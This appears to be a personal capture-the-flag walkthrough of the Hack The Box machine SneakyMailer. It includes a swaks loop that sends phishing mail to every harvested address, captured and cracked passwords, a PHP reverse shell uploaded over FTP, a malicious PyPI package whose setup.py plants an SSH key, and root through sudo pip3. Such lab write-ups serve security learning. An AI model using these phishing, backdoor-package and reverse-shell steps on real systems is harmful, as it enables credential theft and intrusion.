- Running nmap...

	21/tcp   open  ftp      vsftpd 3.0.3
	22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	25/tcp   open  smtp     Postfix smtpd --> Intresting
	80/tcp   open  http     nginx 1.14.2
	143/tcp  open  imap     Courier Imapd (released 2018) --> Intresting
	993/tcp  open  ssl/imap Courier Imapd (released 2018)
	8080/tcp open  http     nginx 1.14.2 

	Both smtp and imap look rather intresting considering that the name of the
	machine is SneakyMailer and also they are a bit uncommon in HTB machines.


- Trying connecting to ftp as anonymous user yields back nothing


- Enumarating web server on port 80 for interesting dirs
	
	Accessing port 80 needs to add http://sneakycorp.htb/ in /etc/hosts
	
	One intersting thing we notice on index page is the message "It is now possible to install modules with pip on our servers"
	
	Going on the /team.php page we get a list of users with a bunch more info per user

	Enumarating gets us the pypi dir which is 403 but if we further enumarate pypi we also get /register.php (Propably a rabbit hole)

	
- Trying to connect to imap -p 143 with some of the user emails i found

	To start a connection with imap -> nc 10.10.10.197 143
	
	To try to login issue command -> tag* login user@gmail.com password   (* A character sequence before each IMAP command)
	(good reference on https://tewarid.github.io/2011/05/10/access-imap-server-from-the-command-line-using-openssl.html)
	
	using swaks we send messages to all the emails with the notion the phis someone

	while read mail; do swaks --to $mail --from it@sneakymailer.htb --header "Subject: Credentials /Errors" --body "goto http://{local-Ip}/" --server 10.10.10.197; done < mails.txt

	hopefully someone clicks on the email message (Need to test that this is it)

	We get the message below:
	firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt

	Url decode gives us:
	firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht


- Connecting to the email using Evolution we can see the following two emails.
	
	"Hello administrator, I want to change this password for the developer account 
		Username: developer
		Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
	Please notify me when you do it"

	"Hello low
	Your current task is to install, test and then erase every python module you 
	find in our PyPI service, let me know if you have any inconvenience."


- Using the credentials we can log in the ftp server

  Upload a php reverse shell on the server accessible from the dev.sneakycorp.htb/ subdomain
  

- Looking arround we find pypi.sneakycorp.htb dir

  inside there is a .htpasswd that contains a hash
  pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/

- Using hashcat we crack the hash

  hashcat -m 1600 pypihash /usr/share/wordlists/rockyou.txt  
  $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui

- According to pypi.sneakycorp.htb we have a pypiserver 
  https://pypi.org/project/pypiserver/1.1.2/#pip

  Following the instructions from the link we see that we can create 
  a custom package, as we have the password for the server

  ** Remember to set HOME=$(pwd) for .pypirc to work **

  python3 setup.py sdist upload -r bigra

  So we create a .pypirc file and and a setup.py file to add
  our ssh key to the server on user low. Then connect with ssh


 [We got the user flag]


 - Running sudo -l to see if user 'low' has any special previleges 

	User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3

	GTFObins for the root

[We got the root flag]
